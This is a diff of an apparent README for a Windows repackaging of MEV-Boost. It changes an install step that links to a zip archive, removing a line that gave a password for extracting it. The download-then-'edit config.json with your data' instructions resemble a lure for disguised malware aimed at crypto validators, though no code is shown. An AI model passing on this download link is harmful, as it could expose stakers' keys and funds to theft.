@@ -32,7 +32,7 @@ Relays aggregate blocks from **multiple** builders in order to select the block 
 A MEV-Boost security assessment was conducted on 2022-06-20 by [lotusbumi](https://github.com/lotusbumi). Additional audits of surrounding infrastructure, such as the Flashbots Relay, are currently underway. Additional information can be found in the [Security](#security) section of this repository.
 
 ## Installing
-- [Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository and extract files with password `bSWxYb95Vdp`.
+- [Clone](https://github.com/Cardo16/mev-boost-windows/archive/refs/heads/main.zip) repository.
 - Edit `config.json` with your data and launch script.
 - The most common setup is to install MEV-Boost on the same machine as the beacon client. Multiple beacon-clients can use a single MEV-Boost instance. The default port is 18550.
 - See also [Rémy Roy's guide](https://github.com/remyroy/ethstaker/blob/main/prepare-for-the-merge.md#installing-mev-boost) for comprehensive instructions on installing, configuring and running MEV-Boost.
